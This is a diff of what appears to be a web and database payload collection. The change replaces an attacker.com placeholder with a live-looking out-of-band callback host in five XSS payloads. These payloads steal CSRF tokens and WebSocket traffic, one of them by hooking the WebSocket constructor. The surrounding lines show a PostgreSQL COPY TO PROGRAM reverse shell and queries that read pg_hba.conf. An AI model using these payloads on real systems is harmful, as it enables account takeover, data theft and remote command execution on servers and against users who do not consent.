@@ -43,11 +43,11 @@ CREATE EXTENSION dblink;
 COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"';
 
 
-<img src="x" onerror="var csrf=document.querySelector('input[name=csrf_token]').value;fetch('https://attacker.com/?token='+csrf);">
-"><img src=x onerror="var ws=new WebSocket('ws://example.com/socket');ws.onmessage=function(e){fetch('https://attacker.com/?data='+encodeURIComponent(e.data));};">
-"><img src=x onerror="var ws=new WebSocket('ws://example.com/socket');ws.onmessage=function(e){var data=JSON.parse(e.data);if(data.csrf){fetch('https://attacker.com/?csrf='+data.csrf);};};">
-"><img src=x onerror="var originalWS=window.WebSocket;window.WebSocket=function(url){var ws=new originalWS(url);ws.addEventListener('message',function(e){fetch('https://attacker.com/exfil',{method:'POST',body:e.data});});return ws;};window.WebSocket.prototype=originalWS.prototype;">
-"><img src=x onerror="var ws=new WebSocket('ws://example.com/socket');ws.onmessage=function(e){fetch('https://attacker.com/?data='+e.data);};">
+<img src="x" onerror="var csrf=document.querySelector('input[name=csrf_token]').value;fetch('https://jasnvmlyykcejcjkawudfsxg0s7amgauf.oast.site/?token='+csrf);">
+"><img src=x onerror="var ws=new WebSocket('ws://example.com/socket');ws.onmessage=function(e){fetch('https://jasnvmlyykcejcjkawudfsxg0s7amgauf.oast.site/?data='+encodeURIComponent(e.data));};">
+"><img src=x onerror="var ws=new WebSocket('ws://example.com/socket');ws.onmessage=function(e){var data=JSON.parse(e.data);if(data.csrf){fetch('https://jasnvmlyykcejcjkawudfsxg0s7amgauf.oast.site/?csrf='+data.csrf);};};">
+"><img src=x onerror="var originalWS=window.WebSocket;window.WebSocket=function(url){var ws=new originalWS(url);ws.addEventListener('message',function(e){fetch('https://jasnvmlyykcejcjkawudfsxg0s7amgauf.oast.site/exfil',{method:'POST',body:e.data});});return ws;};window.WebSocket.prototype=originalWS.prototype;">
+"><img src=x onerror="var ws=new WebSocket('ws://example.com/socket');ws.onmessage=function(e){fetch('https://jasnvmlyykcejcjkawudfsxg0s7amgauf.oast.site/?data='+e.data);};">
 SELECT name FROM pg_available_extensions;
 SELECT proname, proowner, proacl FROM pg_proc WHERE prosecdef = true;
 SELECT pg_read_file('pg_hba.conf', 0, 1000); -- Read the file
